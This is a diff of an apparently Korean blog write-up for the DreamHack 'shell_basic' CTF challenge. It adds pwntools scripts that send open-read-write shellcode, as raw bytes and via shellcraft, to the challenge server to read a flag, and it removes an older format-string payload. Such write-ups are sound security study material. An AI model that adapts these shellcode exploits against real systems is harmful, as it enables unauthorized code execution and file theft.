@@ -48,7 +48,7 @@ Get Input
 # Solution
 Shell Code 와 친숙해지고, ORW에 대한 전반적인 이해를 위한 간단한 문제 같다.
 
-공부한 내용을 바탕으로 문제에서 요구하는 것을 짜보았다. 사실 Flag 위치...를 8바이트로 짜르기 귀찮아서...질문글 몇개 염탐해서 Stack에 넣을 값을 좀 훔쳐왔다(?)
+공부한 내용을 바탕으로 문제에서 요구하는 것을 짜보았다. ASCII 코드 옮기는게 가장 고되었다.
 
 ## shell_basic.asm
 ```
@@ -108,17 +108,65 @@ asm 파일이 완성되었다면 이제 `.o` 파일로 기계어화 시켜야 �
 \x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\xba\x30\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05
 ```
 
-
 # Exploit Code
 ```
+context.log_level       = "DEBUG"
+context.arch            = "amd64"
+
+p = remote("host1.dreamhack.games", 22968)
+
+shell = b"\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\xba\x30\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05"
+
+p.recvuntil("shellcode: ")
+p.sendline(shell)
+p.interactive()
+```
+
+![](/assets/DreamHack/shell-basic-03.png)
+
+는 실패하였다. 알 수 없는 값이 반환 되었다. 이거 딱 `400` 에러 느낌이다.
+
+# Exploit Code #2
+[Pwntools Docu](https://docs.pwntools.com/en/stable/) 의 힘을 빌려 `shellcraft` 를 다시 써본다.
+
+```
 from pwn import *
-context.log_level = "DEBUG"
+context.log_level       = "DEBUG"
+context.arch            = "amd64"
 
-p = remote("ctf.j0n9hyun.xyz",3002)
-payload = p32(0x804a00c) + "%134514096x%n"
+p = remote("host1.dreamhack.games", 22968)
+fpath = "/home/shell_basic/flag_name_is_loooooong"
 
-p.sendline(payload)
+shell = shellcraft.open(fpath)
+shell += shellcraft.read("rax", "rsp", "0x30")
+shell += shellcraft.write(1, "rsp", "0x30")
+
+p.recvuntil("shellcode: ")
+p.sendline(asm(shell))
+p.interactive()
+```
+
+![](/assets/DreamHack/shell-basic-04.png)
+
+`shellcraft`의 Assembling 보면 처음에 `push 1`을 한다. 왜 해야하는가에 대한 의문이 들어 지인을 통해 알게 된 결과, `rsp` 와 opcode 간 구분을 위하여 `NULL` 이나 `SOH` 같은 값을 넣어 구분을 해야 한다고 한다. 바람직 한 것은 `NULL` 로 알려주는 것.
+
+# Exploit Code #3
+따라서 `shell_basic.asm` 파일에 Stack 에 `push 0x00` 을 넣고 나온 byte code를 보면 `\x6a\x00` 를 추가한다.
+
+```
+context.log_level       = "DEBUG"
+context.arch            = "amd64"
+
+p = remote("host1.dreamhack.games", 22968)
+
+shell = b"\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\xba\x30\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05"
+
+p.recvuntil("shellcode: ")
+p.sendline(shell)
 p.interactive()
 ```
 
 # Result
+![](/assets/DreamHack/shell-basic-05.png)
+
+드디어 정상적인 값이 돌아왔다. `NULL`을 놓쳐서 일요일을 왜 허비하였는가 공허.
